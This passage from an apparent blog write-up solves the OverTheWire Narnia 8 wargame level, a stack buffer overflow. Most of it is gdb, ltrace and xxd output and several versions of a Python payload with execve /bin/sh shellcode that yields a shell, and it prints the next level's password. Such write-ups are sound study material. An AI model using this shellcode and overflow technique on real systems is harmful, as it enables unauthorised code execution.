+<pre class="chroma"><code class="language-txt" data-lang="txt">[junk data to fill array][address of ptr][junk data to clobber the stack][address of shell code to jump to replacing ret][shell code we&#39;d want to execute]
+</code></pre></td></tr></table>
+</div>
+</div><p>Now to prove this out and take control of the return address:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span>  <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x66\xd8\xff\xff&#34; + &#34;CCCCDDDDEEEEFFFFGGGGHHHHIIII&#34;&#39;`</span>
+<span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already.</span>
+<span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x66\xd8\xff\xff&#34; + &#34;CCCCDDDDEEEEFFFFGGGGHHHHIIII&#34;&#39;`</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x08048434</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+
+<span class="n">Breakpoint</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0x0804847c</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd664</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span>
+<span class="mh">0xffffd674</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0xffffd866</span> <span class="mh">0x43434343</span> <span class="mh">0x44444444</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x45454545</span> <span class="mh">0x46464646</span> <span class="mh">0x47474747</span> <span class="mh">0x48484848</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x49494949</span> <span class="mh">0xffffd730</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAf</span><span class="o">???</span><span class="n">CCCCDDDDEEEEFFFFGGGGHHHHIIII0</span><span class="o">???</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault.</span>
+<span class="mh">0x44444444</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>SIGSEV</code> and <code>0x44444444</code> means that we&rsquo;ve sucessfully got control over the return address. Next step is to replace the payload with the shellcode used from the earlier narnia&rsquo;s. Using GDB to verify and re-fill in the addresses before running - like we&rsquo;ve seen in the past addresses tend to move around a bit, so double check:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span>  <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x49\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x64\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+<span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already.</span>
+<span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x49\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x64\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x08048434</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="mh">0x08048437</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd644</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="c1"># This is before any copies of our payload</span>
+<span class="mh">0xffffd654</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xffffd849</span> <span class="mh">0xffffd668</span> <span class="mh">0x080484a7</span>
+<span class="mh">0xffffd664</span><span class="o">:</span> <span class="mh">0xffffd849</span> <span class="mh">0x00000000</span> <span class="mh">0xf7e2a286</span> <span class="mh">0x00000002</span>
+<span class="mh">0xffffd674</span><span class="o">:</span> <span class="mh">0xffffd704</span> <span class="mh">0xffffd710</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xf7fc5000</span> <span class="mh">0xf7ffdc0c</span> <span class="mh">0xf7ffd000</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000002</span> <span class="mh">0xf7fc5000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6a4</span><span class="o">:</span> <span class="mh">0x1885e29b</span> <span class="mh">0x226d8e8b</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6b4</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000002</span> <span class="mh">0x08048320</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6c4</span><span class="o">:</span> <span class="mh">0xf7fee710</span> <span class="mh">0xf7e2a199</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000002</span>
+<span class="mh">0xffffd6d4</span><span class="o">:</span> <span class="mh">0x08048320</span> <span class="mh">0x00000000</span> <span class="mh">0x08048341</span> <span class="mh">0x08048490</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>There we have it, we successfully took control and wrote all of the shellcode we could ever dream of:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Breakpoint</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0x0804847c</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd644</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="mh">0x41414141</span> <span class="c1"># After our payload has been copied</span>
+<span class="mh">0xffffd654</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0xffffd849</span> <span class="mh">0x43434343</span> <span class="mh">0xffffd664</span>
+<span class="mh">0xffffd664</span><span class="o">:</span> <span class="mh">0x315e1aeb</span> <span class="mh">0x074688c0</span> <span class="mh">0x5e891e8d</span> <span class="mh">0x0c468908</span>
+<span class="mh">0xffffd674</span><span class="o">:</span> <span class="mh">0xf3890bb0</span> <span class="mh">0x8d084e8d</span> <span class="mh">0x80cd0c56</span> <span class="mh">0xffffe1e8</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x69622fff</span> <span class="mh">0x68732f6e</span> <span class="mh">0x4141414a</span> <span class="mh">0x42424241</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x00000042</span> <span class="mh">0x00000002</span> <span class="mh">0xf7fc5000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6a4</span><span class="o">:</span> <span class="mh">0x1885e29b</span> <span class="mh">0x226d8e8b</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6b4</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000002</span> <span class="mh">0x08048320</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd6c4</span><span class="o">:</span> <span class="mh">0xf7fee710</span> <span class="mh">0xf7e2a199</span> <span class="mh">0xf7ffd000</span> <span class="mh">0x00000002</span>
+<span class="mh">0xffffd6d4</span><span class="o">:</span> <span class="mh">0x08048320</span> <span class="mh">0x00000000</span> <span class="mh">0x08048341</span> <span class="mh">0x08048490</span>
+
+<span class="c1"># Continuing should give us a shell.</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+<span class="o">$</span> <span class="n">whoami</span>
+<span class="n">narnia8</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>With confidence that this will work within <code>gdb</code> it&rsquo;s time to try it out for real and finish this challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x49\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x64\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`^C</span>
+<span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x49\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x64\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAI</span><span class="o">/???????</span><span class="n">g</span><span class="o">???</span>
+<span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Well that didn&rsquo;t work as planned, no shell was spawned and it just printed out the garbage like before. This would mean that the address used in our payload wasn&rsquo;t actually pointing to the right place and that using the addresses from <code>gdb</code> won&rsquo;t work this time. So we need to figure out the address another way, luckily it should be possible to leak information using <code>ltrace</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">ltrace</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x49\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x64\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+<span class="nf">__libc_start_main</span><span class="p">(</span><span class="mh">0x8048490</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="mh">0xffffd734</span><span class="p">,</span> <span class="mh">0x80484d0</span> <span class="o">&lt;</span><span class="n">unfinished</span> <span class="kc">...</span><span class="o">&gt;</span>
+<span class="nf">memset</span><span class="p">(</span><span class="mh">0xffffd674</span><span class="p">,</span> <span class="s">&#39;\0&#39;</span><span class="p">,</span> <span class="m">20</span><span class="p">)</span>                                         <span class="o">=</span> <span class="mh">0xffffd674</span>
+<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s\n&#34;</span><span class="p">,</span> <span class="s">&#34;AAAAAAAAAAAAAAAAAAAAIa\377\377\230\326\377\377\247\204\004\b&#34;</span><span class="n">...AAAAAAAAAAAAAAAAAAAAIa</span><span class="o">???????</span><span class="n">a</span><span class="o">???</span>
+<span class="p">)</span> <span class="o">=</span> <span class="m">37</span>
+<span class="o">+++</span> <span class="nf">exited </span><span class="p">(</span><span class="n">status</span> <span class="m">0</span><span class="p">)</span> <span class="o">+++</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The <code>memset</code> shows that the local buffer&rsquo;s (<code>array[]</code>) address changed. Now for some magic, we can use this bit of information to calculate the location of <code>ptr</code>, where the return address is, and most importantly where the shellcode is going to be located.</p>
+<p>Starting with the <code>array[20]</code>, get the address of <code>ptr</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="mh">0xffffd674</span> <span class="o">+</span> <span class="m">20</span> <span class="n">bytes</span> <span class="n">for</span> <span class="n">size</span> <span class="n">of</span> <span class="n">array</span> <span class="o">=</span> <span class="mh">0xffffd688</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next the address of the shell code, which should be <code>12 bytes</code> after the address of <code>ptr</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">    <span class="mh">0xffffd688</span> <span class="o">+</span> <span class="m">12</span> <span class="n">bytes</span> <span class="n">past</span> <span class="n">ptr</span> <span class="o">=</span> <span class="mh">0xffffd694</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Fixing the addresses in the exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x88\xd6\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x94\xd6\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Well hmm, so that still didn&rsquo;t work out. For whatever reason we can&rsquo;t seem to get the real addresses of the stack when running the program with <code>ltrace</code> or the <code>gdb</code>, so back to the drawing board. It was time to start over and think through everything from the beginning, going all the way to the original running of the program:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAA</span><span class="o">?????????????</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It looks like the program&rsquo;s output is the buffer, since the buffer isn&rsquo;t <code>null</code> terminated and we have exactly 20 &ldquo;A&quot;s in it, the <code>printf</code> should continue on printing whatever else is in the stack until it reaches a null terminator. Which means the address of our original buffer should be visible, in otherwords those <code>?????</code> actually contain valuable data that we just need to be able to view. A hex dumper like <a href="https://en.wikipedia.org/wiki/Hex_dump" target="_blank" rel="noopener noreffer">xxd</a> will allow us to view the output from <code>narnia8</code> in a manner that should reveal what those <code>?????</code> actually represent. Piping the output from <code>narnia8</code> into <code>xxd</code> should do the trick:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20&#39;`</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">g</span> <span class="m">4</span>
+<span class="m">00000000</span><span class="o">:</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
+<span class="m">00000010</span><span class="o">:</span> <span class="m">41414141</span> <span class="n">a9d8ffff</span> <span class="n">d8d6ffff</span> <span class="n">a7840408</span>  <span class="n">AAAA............</span>
+<span class="m">00000020</span><span class="o">:</span> <span class="n">a4d8ffff</span> <span class="m">0</span><span class="n">a</span>                          <span class="n">.....</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So sure enough that is the address. The next thing to be mindful of is that as the size of the input data changes, the addresses will shift a bit. We should be able to use <code>gdb</code> to help determine how much these addresses shift:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">`python -c &#39;print &#34;A&#34;*20&#39;`</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20&#39;`</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x08048437</span> <span class="n">in</span> <span class="nf">func </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd684</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+<span class="mh">0xffffd694</span><span class="o">:</span> <span class="mh">0x00000000</span> <span class="mh">0xffffd886</span> <span class="mh">0xffffd6a8</span> <span class="mh">0x080484a7</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So the address of our input buffer (<code>argv[1]</code>) inside of <code>gdb</code> with a length of 20 is <code>0xffffd886</code> and is located at <code>0xffffd698</code>. With a the input buffer containing shellcode has an address of <code>0xffffd849</code>, and is located here at <code>0xffffd658</code>. The difference between these two on the stack is <code>0xffffd886 - 0xffffd849 = 0x3d</code>. If we make the assumption that this difference should always hold up, we should be able to go back to the output from <code>xxd</code> and use the address it has to calculate exactly what we need for our payload.</p>
+<p>So if the <code>A * 20</code> input buffer is located at <code>0xffffd8a9</code> and use the assumption that <code>0x3d</code> will always hold up, the address of the longer payload that we actually need can be calculated as <code>0xffffd8a9 - 0x3d = 0xffffd86c</code>.</p>
+<p>Which gives the payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x6c\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x82\xd8\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAg</span><span class="o">???</span><span class="n">CCCCAAAA</span><span class="o">?</span><span class="n">^1</span><span class="o">??</span><span class="bp">F</span><span class="o">???</span><span class="bp">F</span>
+                                          <span class="o">?</span>
+                                           <span class="o">???</span><span class="n">V</span>
+                                               ̀<span class="o">?????/</span><span class="n">bin</span><span class="o">/</span><span class="n">shJAAAABBBB</span>
+<span class="n">Segmentation</span> <span class="n">fault</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;re almost there, especially since we can see the string for our shellcode. The piece that&rsquo;s missing is the address of the shellcode. Since it&rsquo;s all contained in the same payload that we are providing as input, we already know the address, just have to calculate it. The input buffer looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-txt" data-lang="txt">[20 bytes for junk][4 bytes addr][4 bytes for junk][4 bytes for addr to shellcode][Shellcode]
+</code></pre></td></tr></table>
+</div>
+</div><p>In other words, there&rsquo;s <code>32 bytes</code> from the start off the input buffer to the start of the shellcode.
+That gives the following address for the start of the shellcode offset from the start off the input buffer:</p>
+<p><code>0xffffd86c + 0x20 = 0xffffd88c</code></p>
+<p>With the updated addresses our payload should now be complete and spawn a shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia8</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">./narnia8</span> <span class="n">`python -c &#39;print &#34;A&#34;*20 + &#34;\x6c\xd8\xff\xff&#34; + &#34;CCCC&#34;+ &#34;\x8c\xd8\xff\xff&#34; + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;`</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAl</span><span class="o">???</span><span class="n">CCCC</span><span class="o">?????</span><span class="n">^1</span><span class="o">??</span><span class="bp">F</span><span class="o">???</span><span class="bp">F</span>
+                                          <span class="o">?</span>
+                                           <span class="o">???</span><span class="n">V</span>
+                                               ̀<span class="o">?????/</span><span class="n">bin</span><span class="o">/</span><span class="n">shJAAAABBBB</span>
+<span class="o">$</span> <span class="n">whoami</span>
+<span class="n">narnia9</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="o">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia9</span>
+<span class="n">eiL5fealae</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This challenge was by far one of my favorites and also one of the most frustrating. After completing this challenge I looked around online to see how others solved it and most of the solutions I came across all relied on using the address of an <code>env</code> variable, which in hindsight would have been quite a bit easier as there are quite a few tricks that allow for easily determine that address. However, I&rsquo;m quite pleased with this solution, especially since it required thinking very carefully about how the contents of the stack are all laid out. It&rsquo;s also worth nothing that with control over the return address many other techniques (like Return-To-X) could be used to spawn a shell or whatever else you&rsquo;d like.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-08-02&nbsp;<i class="fas fa-hashtag fa-fw"></i>68e291e</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
